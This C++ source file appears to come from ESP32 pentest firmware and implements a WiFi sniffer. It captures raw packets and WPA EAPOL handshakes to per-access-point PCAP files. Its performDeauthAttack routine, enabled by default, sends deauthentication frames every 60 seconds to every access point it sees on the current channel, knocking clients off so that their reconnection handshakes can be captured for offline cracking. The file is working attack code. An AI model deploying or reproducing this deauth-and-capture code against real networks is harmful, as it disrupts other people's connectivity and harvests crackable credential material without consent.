#include "wifi_sniffer.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/wifi/wifi_common.h"
#include "esp_event.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "modules/wifi/wifi_atks.h"
#include "nvs_flash.h"
#include <TimeLib.h>
#include <globals.h>

#define MAX_CHANNEL 11
#define CHANNEL 1

// Global variables for compatibility
uint8_t ch = CHANNEL;
bool _only_HS = false;
int num_HS = 0;
bool isLittleFS = true;
std::set<BeaconList> registeredBeacons;
std::set<String> SavedHS;

// Static instance
WiFiSniffer *WiFiSniffer::instance = nullptr;

WiFiSniffer::WiFiSniffer()
    : NetSniffer(), snifferActive(false), currentChannel(CHANNEL), deauthEnabled(true), lastDeauthTime(0),
      lastTime(0), num_EAPOL(0), num_HS(0) {
    instance = this;
}

WiFiSniffer::~WiFiSniffer() {
    cleanup();
    clearBeacons();
    clearSavedHS();
    instance = nullptr;
}

bool WiFiSniffer::initialize() {
    nvs_flash_init();
    ESP_ERROR_CHECK(esp_netif_init());

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));

    setupWiFiConfig();

    // Prepare deauth frame
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));

    Serial.println("WiFi Sniffer initialized!");
    return true;
}

void WiFiSniffer::setupWiFiConfig() {
    wifi_config_t wifi_config;
    strcpy((char *)wifi_config.ap.ssid, "BruceSniffer");
    strcpy((char *)wifi_config.ap.password, "brucenet");
    wifi_config.ap.ssid_len = strlen("BruceSniffer");
    wifi_config.ap.channel = 1;
    wifi_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
    wifi_config.ap.ssid_hidden = 1;
    wifi_config.ap.max_connection = 2;
    wifi_config.ap.beacon_interval = 100;

    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());
}

bool WiFiSniffer::startSniffer() {
    if (snifferActive) return true;

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(snifferCallback);

    wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
    esp_wifi_set_channel(currentChannel, secondCh);

    snifferActive = true;
    lastDeauthTime = millis();
    ch = currentChannel; // Update global variable

    Serial.println("WiFi Sniffer started!");
    return true;
}

void WiFiSniffer::stopSniffer() {
    if (!snifferActive) return;

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    snifferActive = false;

    Serial.println("WiFi Sniffer stopped!");
}

void WiFiSniffer::setChannel(uint8_t channel) {
    if (channel < 1 || channel > MAX_CHANNEL) return;

    bool wasActive = snifferActive;
    if (wasActive) {
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(nullptr);
    }

    currentChannel = channel;
    ch = channel; // Update global variable

    wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
    esp_wifi_set_channel(currentChannel, secondCh);

    if (wasActive) {
        vTaskDelay(50 / portTICK_RATE_MS);
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb(snifferCallback);
    }
}

void WiFiSniffer::nextChannel() {
    uint8_t nextCh = currentChannel + 1;
    if (nextCh > MAX_CHANNEL) nextCh = 1;
    setChannel(nextCh);
}

void WiFiSniffer::prevChannel() {
    uint8_t prevCh = currentChannel - 1;
    if (prevCh < 1) prevCh = MAX_CHANNEL;
    setChannel(prevCh);
}

void WiFiSniffer::performDeauthAttack() {
    if (!deauthEnabled || !snifferActive) return;

    unsigned long currentTime = millis();
    if ((currentTime - lastDeauthTime) < 60000) return; // Only every 60 seconds

    if (registeredBeacons.size() > 40) {
        registeredBeacons.clear(); // Clear to avoid memory issues
    }

    for (const auto &beacon : registeredBeacons) {
        if (beacon.channel == currentChannel) {
            memcpy(&ap_record.bssid, beacon.MAC, 6);
            wsl_bypasser_send_raw_frame(&ap_record, beacon.channel);
            send_raw_frame(deauth_frame, 26);
            vTaskDelay(2 / portTICK_RATE_MS);
        }
    }
    lastDeauthTime = currentTime;
}

void WiFiSniffer::cleanup() {
    stopSniffer();
    esp_wifi_stop();
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_deinit();
    wifiDisconnect();
    vTaskDelay(1 / portTICK_RATE_MS);
}

void WiFiSniffer::snifferCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (instance) { instance->handleRawPacket(buf, type); }
}

void WiFiSniffer::handleRawPacket(void *buf, wifi_promiscuous_pkt_type_t type) {
    // Check LittleFS space if needed
    if (isLittleFS && !checkLittleFsSizeNM()) {
        returnToMenu = true;
        stopSniffer();
        return;
    }

    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    incrementPacketCounter();

    // Save packet to main PCAP if not handshake-only mode
    if (!_only_HS) { savePacketToFile(pkt, type); }

    // Process packet for EAPOL and beacons
    const uint8_t *frame = pkt->payload;
    const uint16_t frameControl = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);
    const uint8_t frameType = (frameControl & 0x0C) >> 2;
    const uint8_t frameSubType = (frameControl & 0xF0) >> 4;

    if (isItEAPOL(pkt)) { processEAPOLPacket(pkt); }

    if (frameType == 0x00 && frameSubType == 0x08) { processBeaconFrame(pkt); }
}

void WiFiSniffer::savePacketToFile(const wifi_promiscuous_pkt_t *pkt, wifi_promiscuous_pkt_type_t type) {
    if (fileOpen) {
        wifi_pkt_rx_ctrl_t ctrl = pkt->rx_ctrl;
        uint32_t timestamp = now();
        uint32_t microseconds = (unsigned int)(micros() - millis() * 1000);
        uint32_t len = ctrl.sig_len;

        if (type == WIFI_PKT_MGMT) {
            len -= 4; // Remove checksum bytes
        }

        newPacketSD(timestamp, microseconds, len, (uint8_t *)pkt->payload);
    }
}

void WiFiSniffer::processEAPOLPacket(const wifi_promiscuous_pkt_t *pkt) {
    num_EAPOL++;
    if (isLittleFS) {
        saveHandshake(pkt, false, *fileSystem);
    } else {
        saveHandshake(pkt, false, SD);
    }
}

void WiFiSniffer::processBeaconFrame(const wifi_promiscuous_pkt_t *pkt) {
    const uint8_t *frame = pkt->payload;
    const uint8_t *senderAddr = frame + 10;

    // Register beacon
    registerBeacon((const char *)senderAddr, currentChannel);

    // Adjust packet length
    wifi_promiscuous_pkt_t *modPkt = const_cast<wifi_promiscuous_pkt_t *>(pkt);
    modPkt->rx_ctrl.sig_len -= 4;

    // Save handshake
    if (isLittleFS) {
        saveHandshake(modPkt, true, *fileSystem);
    } else {
        saveHandshake(modPkt, true, SD);
    }
}

void WiFiSniffer::registerBeacon(const char *mac, uint8_t channel) {
    BeaconList beacon;
    memcpy(beacon.MAC, mac, 6);
    beacon.channel = channel;
    registeredBeacons.insert(beacon);
}

void WiFiSniffer::resetAllCounters() {
    resetPacketCounter();
    resetEAPOLCounter();
    resetHandshakeCounter();
}

void WiFiSniffer::sniffer_setup() {
    bool redraw = true;
    drawMainBorderWithTitle("RAW SNIFFER");

    // Setup file system
    if (!setupFileSystem()) {
        displayError("File System Init Failed", true);
        return;
    }

    openFile(*fileSystem);
    displayTextLine("Sniffing Started");

    // Clear previous session data
    clearSavedHS();
    clearBeacons();

    // Initialize WiFi
    if (!initialize()) {
        displayError("WiFi Init Failed", true);
        return;
    }

    if (!startSniffer()) {
        displayError("Sniffer Start Failed", true);
        return;
    }

    if (isLittleFS && !checkLittleFsSize()) {
        cleanup();
        return;
    }

    // Reset all counters
    resetAllCounters();

    handleUserInterface();
}

void WiFiSniffer::handleUserInterface() {
    bool redraw = true;

    for (;;) {
        if (returnToMenu) {
            Serial.println("Not enough space on LittleFS");
            displayError("LittleFS Full", true);
            break;
        }

        // Channel control
        if (check(NextPress)) {
            nextChannel();
            redraw = true;
        }

        if (PrevPress) {
#if !defined(HAS_KEYBOARD) && !defined(HAS_ENCODER)
            LongPress = true;
            long _tmp = millis();
            while (PrevPress) {
                if (millis() - _tmp > 150)
                    tft.drawArc(
                        tftWidth / 2,
                        tftHeight / 2,
                        25,
                        15,
                        0,
                        360 * (millis() - _tmp) / 700,
                        getColorVariation(bruceConfig.priColor),
                        bruceConfig.bgColor
                    );
                vTaskDelay(10 / portTICK_RATE_MS);
            }
            if (millis() - _tmp > 700) {
                returnToMenu = true;
                closeFile();
                break;
            }
#endif
            check(PrevPress);
            prevChannel();
            redraw = true;
        }

#if defined(HAS_KEYBOARD) || defined(T_EMBED)
        if (check(EscPress)) {
            returnToMenu = true;
            closeFile();
            break;
        }
#endif

        if (check(SelPress) || redraw) {
            vTaskDelay(200 / portTICK_PERIOD_MS);
            if (!redraw) {
                options = {
                    {"New File",
                     [=]() {
                         closeFile();
                         fileCounter++;
                         openFile(*fileSystem);
                     }                                                                                    },
                    {deauthEnabled ? "Deauth->OFF" : "Deauth->ON", [=]() { enableDeauth(!deauthEnabled); }},
                    {_only_HS ? "All packets" : "EAPOL/HS only",
                     [=]() {
                         _only_HS = !_only_HS;
                         setOnlyHandshakes(_only_HS);
                     }                                                                                    },
                    {"Reset Counter",                              [=]() { resetAllCounters(); }          },
                    {"Exit Sniffer",                               [=]() { returnToMenu = true; }         },
                };
                loopOptions(options);
            }
            if (returnToMenu) break;

            updateDisplay();
            redraw = false;
        }

        updateDisplay();
        performDeauthAttack();

        vTaskDelay(100 / portTICK_PERIOD_MS);
    }
}

void WiFiSniffer::updateDisplay() {
    unsigned long currentTime = millis();

    if (currentTime - lastTime > 100) tft.drawPixel(0, 0, 0);

    if (fileOpen && currentTime - lastTime > 1000) {
        pcapFile.flush();
        lastTime = currentTime;
        tft.drawString("EAPOL: " + String(num_EAPOL) + " HS: " + String(num_HS), 10, tftHeight - 18);
        tft.drawCentreString("Packets " + String(getPacketCount()), tftWidth / 2, tftHeight - 26, 1);

        // Update global num_HS for compatibility
        ::num_HS = SavedHS.size();
    }
}

void WiFiSniffer::setHandshakeSniffer() {
    if (snifferActive) { esp_wifi_set_promiscuous_rx_cb(snifferCallback); }
}

// Include the EAPOL detection and saveHandshake methods from the original code
bool WiFiSniffer::isItEAPOL(const wifi_promiscuous_pkt_t *packet) {
    const uint8_t *payload = packet->payload;
    int len = packet->rx_ctrl.sig_len;

    if (len < (24 + 8 + 4)) { return false; }

    if (payload[24] == 0xAA && payload[25] == 0xAA && payload[26] == 0x03 && payload[27] == 0x00 &&
        payload[28] == 0x00 && payload[29] == 0x00 && payload[30] == 0x88 && payload[31] == 0x8E) {
        return true;
    }

    if ((payload[0] & 0x0F) == 0x08) {
        if (payload[26] == 0xAA && payload[27] == 0xAA && payload[28] == 0x03 && payload[29] == 0x00 &&
            payload[30] == 0x00 && payload[31] == 0x00 && payload[32] == 0x88 && payload[33] == 0x8E) {
            return true;
        }
    }

    return false;
}

void WiFiSniffer::saveHandshake(const wifi_promiscuous_pkt_t *packet, bool beacon, FS &fs) {
    const uint8_t *addr1 = packet->payload + 4;
    const uint8_t *addr2 = packet->payload + 10;
    const uint8_t *bssid = packet->payload + 16;
    const uint8_t *apAddr;

    if (memcmp(addr1, bssid, 6) == 0) {
        apAddr = addr1;
    } else {
        apAddr = addr2;
    }

    char fileName[50];
    sprintf(
        fileName,
        "/BrucePCAP/handshakes/HS_%02X%02X%02X%02X%02X%02X.pcap",
        apAddr[0],
        apAddr[1],
        apAddr[2],
        apAddr[3],
        apAddr[4],
        apAddr[5]
    );

    bool FileExiste = (SavedHS.find(String((char *)apAddr, 6)) != SavedHS.end());

    if (beacon && !FileExiste) return;

    File FilePcap = fs.open(fileName, FileExiste ? FILE_APPEND : FILE_WRITE);
    if (!FilePcap) {
        Serial.println("Failed to create EAPOL/Handshake PCAP file");
        return;
    }

    if (!beacon && !FileExiste) {
        SavedHS.insert(String((char *)apAddr, 6));
        num_HS++;
        writeHeader(FilePcap);
    }

    if (beacon && FileExiste) {
        BeaconList thisBeacon;
        memcpy(thisBeacon.MAC, (char *)apAddr, 6);
        thisBeacon.channel = currentChannel;
        if (registeredBeacons.find(thisBeacon) != registeredBeacons.end()) {
            FilePcap.close();
            return;
        }
        registeredBeacons.insert(thisBeacon);
    }

    pcaprec_hdr_t pcap_packet_header;
    pcap_packet_header.ts_sec = packet->rx_ctrl.timestamp / 10000;
    pcap_packet_header.ts_usec = packet->rx_ctrl.timestamp % 10000;
    pcap_packet_header.incl_len = packet->rx_ctrl.sig_len;
    pcap_packet_header.orig_len = packet->rx_ctrl.sig_len;

    FilePcap.write((const byte *)&pcap_packet_header, sizeof(pcaprec_hdr_t));
    FilePcap.write(packet->payload, packet->rx_ctrl.sig_len);
    FilePcap.close();
}
